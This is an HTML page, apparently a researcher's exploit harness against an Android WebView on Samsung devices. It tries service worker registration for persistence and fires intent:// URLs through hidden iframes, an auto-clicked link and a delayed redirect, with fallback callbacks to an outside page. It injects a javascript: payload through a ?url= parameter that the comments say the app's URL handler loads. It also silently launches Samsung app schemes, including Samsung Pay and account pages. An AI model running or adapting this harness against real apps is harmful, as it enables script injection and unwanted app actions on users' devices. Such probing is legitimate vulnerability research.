<!DOCTYPE html>
<html>
<head><title>SW + Intent Test</title></head>
<body>
<h2>Service Worker + Intent Scheme Tests</h2>
<div id="r" style="font-family:monospace;white-space:pre-wrap;font-size:10px;background:#eee;padding:8px;word-break:break-all;"></div>
<script>
var r = document.getElementById('r');
function log(msg) { r.textContent += msg + '\n'; }

log('=== Service Worker Persistence Test ===');
log('');

// Test 1: Register a Service Worker for persistent execution
if ('serviceWorker' in navigator) {
  log('[SW] Attempting registration...');
  // We can't register a SW from a different origin, but let's test
  navigator.serviceWorker.register('./sw.js')
    .then(function(reg) {
      log('[SW] REGISTERED! Scope: ' + reg.scope);
      log('[SW] State: ' + (reg.active ? 'active' : reg.waiting ? 'waiting' : 'installing'));
    })
    .catch(function(e) {
      log('[SW] Registration failed: ' + e.message);
    });
} else {
  log('[SW] Not supported');
}
log('');

// Test 2: intent:// scheme tests via different methods
log('=== Intent Scheme Tests ===');
log('Testing if intent:// triggers shouldOverrideUrlLoading...');
log('');

// Method A: iframe src
log('[Intent A] iframe.src = intent://...');
try {
  var f1 = document.createElement('iframe');
  f1.style.cssText = 'width:1px;height:1px;border:none;position:absolute;left:-9999px';
  f1.src = 'intent://scan/#Intent;scheme=zxing;S.browser_fallback_url=https://tomerfry.github.io/random/callback.html?from=iframe;end';
  document.body.appendChild(f1);
  log('  iframe created with intent:// src');
} catch(e) { log('  Error: ' + e); }

// Method B: window.location
log('[Intent B] Delayed window.location = intent:// (in 3s)');
setTimeout(function() {
  try {
    window.location = 'intent://test/#Intent;scheme=test;S.browser_fallback_url=https://tomerfry.github.io/random/callback.html?from=location;end';
    log('  window.location set');
  } catch(e) { log('  Error: ' + e); }
}, 3000);

// Method C: <a> tag click
log('[Intent C] Creating clickable intent:// link...');
var a = document.createElement('a');
a.href = 'intent://test/#Intent;scheme=test;S.browser_fallback_url=https://tomerfry.github.io/random/callback.html?from=anchor;end';
a.textContent = 'Click to test intent://';
a.id = 'intentlink';
document.body.appendChild(a);
// Auto-click
try {
  a.click();
  log('  Auto-click dispatched');
} catch(e) { log('  Auto-click error: ' + e); }

// Method D: Form submit
log('[Intent D] Form action with intent:// scheme');
try {
  var form = document.createElement('form');
  form.action = 'intent://test/#Intent;scheme=test;S.browser_fallback_url=https://tomerfry.github.io/random/callback.html?from=form;end';
  form.method = 'GET';
  form.style.display = 'none';
  document.body.appendChild(form);
  // Don't auto-submit as it would navigate away
  log('  Form created (not submitted)');
} catch(e) { log('  Error: ' + e); }

log('');

// Test 3: javascript: URI tests
log('=== javascript: URI Injection via shouldOverrideUrlLoading ===');

// The shouldOverrideUrlLoading extracts ?url= param from http(s) navigations
// If we navigate to https://anything.com?url=javascript:CODE the handler will
// call webView.loadUrl(URLDecoder.decode("javascript:CODE"))

log('[JS Inject] Testing ?url= parameter injection...');
// Method: iframe navigating to URL with ?url=javascript: payload
try {
  var f2 = document.createElement('iframe');
  f2.style.cssText = 'width:1px;height:1px;border:none;position:absolute;left:-9999px';
  // This should trigger shouldOverrideUrlLoading which extracts url= and calls loadUrl
  f2.src = 'https://example.com/?url=javascript:document.title="JS_INJECTED_VIA_URL_PARAM"';
  document.body.appendChild(f2);
  log('  iframe with ?url=javascript: created');
} catch(e) { log('  Error: ' + e); }

// Check if title changes after injection
setTimeout(function() {
  log('');
  log('=== Delayed Check (4s) ===');
  log('document.title: ' + document.title);
  log('(If title is "JS_INJECTED_VIA_URL_PARAM", the ?url= injection worked)');
}, 4000);

// Test 4: Can we navigate to samsungapps:// or other Samsung schemes?
log('');
log('=== Samsung Scheme Tests ===');
var schemes = [
  'samsungapps://MCSLaunch?action=each_event&url=https://tomerfry.github.io/random/callback.html',
  'samsungpay://launch?action=upi_number',
  'samsungaccount://MainPage',
  'voc://view/contactUs'
];

schemes.forEach(function(scheme, i) {
  setTimeout(function() {
    try {
      var f = document.createElement('iframe');
      f.style.cssText = 'width:0;height:0;border:none;position:absolute';
      f.src = scheme;
      document.body.appendChild(f);
      log('[Scheme ' + i + '] Tried: ' + scheme.substring(0,60) + '...');
    } catch(e) { log('[Scheme ' + i + '] Error: ' + e); }
  }, i * 500);
});

setTimeout(function() {
  log('');
  log('=== Final Results ===');
  log('document.title: ' + document.title);
  log('Tests complete at: ' + new Date().toISOString());
}, 8000);

</script>
</body>
</html>
